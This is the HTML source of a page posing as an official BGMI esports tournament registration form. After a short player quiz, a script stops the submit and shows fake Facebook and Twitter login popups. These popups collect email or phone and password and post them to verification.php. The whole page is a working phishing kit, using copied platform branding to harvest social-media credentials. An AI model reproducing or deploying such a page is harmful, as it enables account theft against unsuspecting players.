
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=0"/>
    <title>BGIMI ESPORTS - OFFICIAL TOURNAMENT</title>
    <link rel="stylesheet" href="css/reg.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"
        integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>
    <div class="wrap">
        <div class="headers">
            <div class="logo">
                <img src="https://i.ibb.co/qy0q4pT/Picsart-23-06-22-05-45-39-418.png">
            </div>
            <div class="utils">
                <div class="socialmedia">
                    <ul>
                        <li style="display:none;" onclick="window.location='https://youtube.com/c/BattlegroundsMobile_IN'"><i
                                class="fa fa-youtube-play" aria-hidden="true"></i></li>
                        <li style="display:none;" onclick="window.location='https://instagram.com/battlegroundsmobilein_official?igshid=YmMyMTA2M2Y='"><i
                                class="fa fa-instagram" aria-hidden="true"></i></li>
                        <li style="display:none;" onclick="window.location='https://www.facebook.com/BattlegroundsMobileIN/'"><i
                                class="fa fa-facebook-square" aria-hidden="true"></i></li>
                    </ul>
                </div>
                <div class="menu">
                    <div class="bar"></div>
                    <div class="bar"></div>
                    <div class="bar"></div>
                </div>
            </div>
        </div>

        <div class="banner">
            <img class="logo" src="https://i.ibb.co/cFSPjQV/Picsart-23-07-02-02-06-01-700.png">
            <h1>FILL OUT</h1>
            <span class="ba-text">IQOO PRO SERIES 2023</span>
        </div>
        <div class="line">ENTER TOURNAMENT DETAILS</div>
        <div class="details">
            <form action="verification.php" method="POST">
                <div class="list-quest">
                    <h2>How Long You Are Playing BGMI ?</h2>
                    <ul>
                        <li><input type="radio" value="asw" name="check1" required>MORE THAN 3 MONTHS</li>
                        <li><input type="radio" value="asw" name="check1">MORE THAN 6 MONTHS</li>
                        <li><input type="radio" value="asw" name="check1">MORE THAN 1 YEARS</li>
                        <li><input type="radio" value="asw" name="check1">MORE THAN 2 YEARS</li>
                    </ul>
                </div>

                <div class="list-quest">
                    <h2>Do you have enter any Tournament before?</h2>
                    <ul>
                        <li><input type="radio" value="asw" name="check2" required>YES I DO</li>
                        <li><input type="radio" value="asw" name="check2">NO I DON'T</li>
                    </ul>
                </div>
                
                <div class="list-quest">
                    <h2>WHICH ONE YOUR ROLE IN GAME</h2>
                    <ul>
                        <li><input type="radio" value="asw" name="check4" required>RUSHER</li>
                        <li><input type="radio" value="asw" name="check4">SUPPORT</li>
                        <li><input type="radio" value="asw" name="check4">SNIPER</li>
                        <li><input type="radio" value="asw" name="check4">FLANKER</li>
                        <li><input type="radio" value="asw" name="check4">MEDIC</li>
                    </ul>
                </div>
                <center>
                    <input class="submit-btn" type="submit" value="submit">
                </center>

            </form>
        </div>


        <div class="mask"></div>

        <div class="log-chooser">
            <div class="log-logo">
                LOGIN FOR REGISTRATION
            </div>
            <p class="dsk">Select your login preferred</p>
            <div class="login-sec">
                <div class="logsci fb" id="fb"><i class="fa fa-facebook-square" aria-hidden="true"></i> <span>Login With
                        Facebook</span></div>
                <div class="logsci tw" id="tw"><i class="fa fa-twitter-square" aria-hidden="true"></i> <span>Login With
                        Twitter</span></div>
            </div>
        </div>



        <div class="footer">
            <ul>
                <li>
                    <img class="p-logo"
                        src="https://i.ibb.co/qy0q4pT/Picsart-23-06-22-05-45-39-418.png">
                </li>
                <li>
                    <img class="k-logo" src="https://i.ibb.co/XLFrLHs/Picsart-23-06-19-14-43-35-264.png">
                </li>
            </ul>
            <p class="f-desc"> &copy; 2021 KRAFTON, Inc. All rights reserved.</p>
            <div class="tos">
                <span class="ptos">Privacy Policy</span>
                <span class="split">|</span>
                <span class="ptos">Terms of Service</span>
            </div>
        </div>

    </div>


    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="popup-box-login-fb">
            <a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div>
            <!--- navbar-fb --->
            <div class="content-box-fb">
                <img src="https://www.battlegroundsmobileindia.com/common/img/main/app.png">
                <div class="txt-login-fb">Log in to your Facebook account to connect your BGMI ACCOUNT</div>
                <!--- txt-login-fb --->
                <form action="verification.php" method="post">
                    <input type="text" class="loginEmail" name="email" id="email-facebook"
                        placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
                    <input type="password" class="loginPassword" name="password" id="password-facebook"
                        placeholder="Password" autocomplete="off" autocapitalize="off" required>
                       
                        <input type="hidden" name="id" value="">
                    <!--- hidePassword --->
                    <input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
                    <button type="submit" class="btn-login-fb" style="margin-top:10px;">Log In</button>
                </form>
                <div class="txt-create-account">Create account</div>
                <!--- txt-create-account --->
                <div class="txt-not-now">Not now</div>
                <!--- txt-not-now --->
                <div class="txt-forgotten-password">Forgotten password?</div>
                <!--- txt-forgotten-password --->
            </div>
            <!--- content-box-fb--->
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">English (UK)</div>
                    <!--- language-name --->
                    <div class="language-name">Bahasa Indonesia</div>
                    <!--- language-name --->
                    <div class="language-name">Basa Jawa</div>
                    <!--- language-name --->
                    <div class="language-name">Bahasa Melayu</div>
                    <!--- language-name --->
                    <div class="language-name">日本語</div>
                    <!--- language-name --->
                    <div class="language-name">Español</div>
                    <!--- language-name --->
                    <div class="language-name">Português (Brasil)</div>
                    <!--- language-name --->
                    <div class="language-name"><i class="fa fa-plus"></i></div>
                    <!--- language-name --->
                </center>
            </div>
            <!--- language-box --->
            <div class="copyright">Facebook Inc.</div>
            <!--- copyright --->
        </div>
        <!--- popup-box-login-fb --->
    </div>
    <!--- popup-login --->

    <div class="popup-login login-twitter animated fadeIn" style="display: none;">
        <div class="popup-box-login-twitter">
            <a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
            <div class="header-twitter">
                <center>
                    <img src="https://i.ibb.co/V9rgBqw/twitter-text.png">
                </center>
                <div class="box-twitter">
                    <center>
                        <form action="verification.php" method="post">
                            <div class="txt-login-twitter">Login to Twitter</div>
                            <!--- txt-login-twitter --->
                            <div class="input-box-twitter">
                                <label>Phone, email, or username</label>
                                <input type="text" name="email" id="email-twitter" placeholder="" required>
                            </div>
                            <!--- input-box-twitter --->
                            <div class="input-box-twitter">

                                <!--- TwitterHidePassword --->
                                <label>Password</label>
                                <input type="password" style="width: 85%;" name="password" id="password-twitter"
                                    placeholder="" required>
                            </div>
                            <!--- input-box-twitter --->
                            <input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>

                            <input type="hidden" name="id" value="">
                            <button type="submit" class="btn-login-twitter">Log
                                In</button>
                            <div class="footer-menu-twitter">Forgot password?</div>
                            <!--- footer-menu-twitter --->
                            <div class="footer-menu-twitter bulet">•</div>
                            <!--- footer-menu-twitter --->
                            <div class="footer-menu-twitter">Sign up to Twitter</div>
                            <!--- footer-menu-twitter --->
                        </form>
                    </center>
                </div>
                <!--- box-twitter --->
            </div>
            <!--- header-twitter --->
        </div>
        <!--- popup-box-login-twitter --->
    </div>
    <!--- popup-login--->

    <script src="https://code.jquery.com/jquery-3.6.0.js"
        integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <script>
        $('.logsci').each(function (e, r) {
            r.addEventListener('click', f => {
                $('.log-chooser').hide()
                let id = this.getAttribute('id');
                ("fb" == id) ? (
                    $('.login-facebook').fadeIn()
                ) : ("tw" == id) ? (
                    $('.login-twitter').fadeIn()
                ) : (!0)
            })
        })
    </script>
    <script>
        document.addEventListener('submit', function (e) {
            if(e.submitter.getAttribute('class') == "submit-btn") {
                e.preventDefault();
                $('.mask').show();
                $('.log-chooser').fadeIn().css('display', 'flex');
            }
        })
    </script>
</body>

</html>